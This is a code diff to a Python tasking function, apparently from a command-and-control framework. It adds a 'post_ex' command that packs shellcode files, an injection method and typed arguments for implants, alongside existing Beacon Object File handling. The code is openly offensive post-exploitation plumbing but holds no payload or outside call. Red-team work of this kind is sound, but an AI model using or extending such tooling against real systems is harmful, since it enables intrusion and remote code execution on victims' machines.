@@ -117,32 +117,34 @@ def RespTasking(Tasks, Socks) -> bytes:
             Dbg3(f"sub id: {SubCommandID}")
 
         # Special handling for BOF command
-        if CommandID == Commands["exec-bof"]["hex_code"]:
+        if CommandID == Commands["post_ex"]["hex_code"]:
             args_buffer = Packer()
             
-            if "bof_file" in Parameters:
+            if "method" in Parameters:
+                tsk_psr.Int32( Parameters["method"] )
+                Dbg3(f"added method {Parameters["method"]}")
+
+            if "sc_file" in Parameters:
                 try:
-                    file_bytes = bytes.fromhex(Parameters["bof_file"])
+                    file_bytes = bytes.fromhex(Parameters["sc_file"])
                     tsk_psr.Bytes(file_bytes)
+                    Dbg3(f"added file bytes with len {len(file_bytes)}")
                 except Exception as e:
-                    Dbg3(f"Failed to process bof_file: {str(e)}")
-                    raise ValueError(f"Invalid bof_file content: {str(e)}")
-            
-            if "bof_id" in Parameters:
-                tsk_psr.Int32( Parameters["bof_id"] )
+                    Dbg3(f"Failed to process sc_file: {str(e)}")
+                    raise ValueError(f"Invalid sc_file content: {str(e)}")
 
-            BofArgs = []
-            if "bof_args" in Parameters:
-                BofArgs = ast.literal_eval(Parameters["bof_args"])
+            ScArgs = []
+            if "sc_args" in Parameters:
+                ScArgs = ast.literal_eval(Parameters["sc_args"])
 
-            if BofArgs and isinstance(BofArgs, list):
-                Dbg3(f"Processing bof_args: {BofArgs}")
-                for arg in BofArgs:
+            if ScArgs and isinstance(ScArgs, list):
+                Dbg3(f"Processing sc_args")
+                for arg in ScArgs:
                     try:
                         if isinstance(arg, dict) and "type" in arg and "value" in arg:
                             arg_type = arg["type"]
                             value = arg["value"]
-                            Dbg3(f"Processing argument - type: {arg_type}, value: {value}")
+                            # Dbg3(f"Processing argument - type: {arg_type}, value: {value}")
                             
                             if arg_type == "int16":
                                 args_buffer.Int16(int(value))
@@ -171,7 +173,65 @@ def RespTasking(Tasks, Socks) -> bytes:
                         Dbg3(f"Failed to process argument {arg}: {str(e)}")
                         raise ValueError(f"Failed to process argument {arg}: {str(e)}")
 
-            Dbg3(f"[{args_buffer.length}] {args_buffer.buffer}")
+            Dbg3(f"sc args with len: {args_buffer.length}")
+            tsk_psr.Int32(args_buffer.length) 
+            tsk_psr.Pad(args_buffer.buffer)
+
+        elif CommandID == Commands["exec-bof"]["hex_code"]:
+            args_buffer = Packer()
+            
+            if "bof_file" in Parameters:
+                try:
+                    file_bytes = bytes.fromhex(Parameters["bof_file"])
+                    tsk_psr.Bytes(file_bytes)
+                except Exception as e:
+                    Dbg3(f"Failed to process bof_file: {str(e)}")
+                    raise ValueError(f"Invalid bof_file content: {str(e)}")
+            
+            if "bof_id" in Parameters:
+                tsk_psr.Int32( Parameters["bof_id"] )
+
+            BofArgs = []
+            if "bof_args" in Parameters:
+                BofArgs = ast.literal_eval(Parameters["bof_args"])
+
+            if BofArgs and isinstance(BofArgs, list):
+                Dbg3(f"Processing bof_args: {BofArgs}")
+                for arg in BofArgs:
+                    try:
+                        if isinstance(arg, dict) and "type" in arg and "value" in arg:
+                            arg_type = arg["type"]
+                            value = arg["value"]
+                            # Dbg3(f"Processing argument - type: {arg_type}, value: {value}")
+                            
+                            if arg_type == "int16":
+                                args_buffer.Int16(int(value))
+                            elif arg_type == "int32":
+                                args_buffer.Int32(int(value))
+                            elif arg_type == "bytes":
+                                args_buffer.Bytes(bytes.fromhex(value))
+                            elif arg_type == "char":
+                                args_buffer.Bytes(str(value).encode("utf-8"))
+                            elif arg_type == "wchar":
+                                args_buffer.Wchar(value)
+                            elif arg_type == "base64":
+                                try:
+                                    decoded = base64.b64decode(value)
+                                    args_buffer.Pad(decoded)
+                                except Exception:
+                                    Dbg3(f"Invalid base64: {value}")
+                                    raise ValueError(f"Invalid base64: {value}")
+                            else:
+                                Dbg3(f"Unknown argument type: {arg_type}")
+                                raise ValueError(f"Unknown argument type: {arg_type}")
+                        else:
+                            Dbg3(f"Invalid argument format: {arg}")
+                            raise ValueError(f"Invalid argument format: {arg}")
+                    except Exception as e:
+                        Dbg3(f"Failed to process argument {arg}: {str(e)}")
+                        raise ValueError(f"Failed to process argument {arg}: {str(e)}")
+
+            # Dbg3(f"[{args_buffer.length}] {args_buffer.buffer}")
             tsk_psr.Int32(args_buffer.length) 
             tsk_psr.Pad(args_buffer.buffer)
         else:
@@ -183,7 +243,7 @@ def RespTasking(Tasks, Socks) -> bytes:
                         tsk_psr.Pad(hex_bytes)
                     except (ValueError, AttributeError, TypeError):
                         if isinstance(Val, str):
-                            Dbg3(f"key: {Key} | parameter: {Val} [type: str]")
+                            Dbg3(f"key: {Key} | parameter: {len(Val)} [type: str]")
                             tsk_psr.Bytes(str(Val).encode())
                         elif isinstance(Val, int):
                             Dbg3(f"key: {Key} | parameter: {int(Val)} [type: int]")
@@ -196,7 +256,7 @@ def RespTasking(Tasks, Socks) -> bytes:
                             tsk_psr.Pad(Val)
 
         Pkg.Bytes(tsk_psr.buffer)
-        Dbg3(f"task uuid: {TaskUUID} with [{len(tsk_psr.buffer)} bytes]")
+        # Dbg3(f"task uuid: {TaskUUID} with [{len(tsk_psr.buffer)} bytes]")
 
     Dbg3("------------------------")
     return Pkg.buffer
